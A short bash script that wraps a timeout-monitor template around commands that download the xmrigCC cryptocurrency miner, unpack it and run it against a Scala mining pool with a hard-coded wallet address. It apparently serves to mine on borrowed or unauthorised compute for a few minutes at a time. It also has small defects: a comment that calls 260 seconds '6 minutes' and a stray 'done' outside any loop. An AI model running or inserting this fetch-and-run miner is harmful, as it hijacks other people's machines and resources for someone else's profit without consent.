#!/bin/bash

Timeout=260 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

apt update
wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz
tar xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz
cd miner
./xmrigDaemon -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Rdx -a panthera -k -t4
done
sleep 999
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"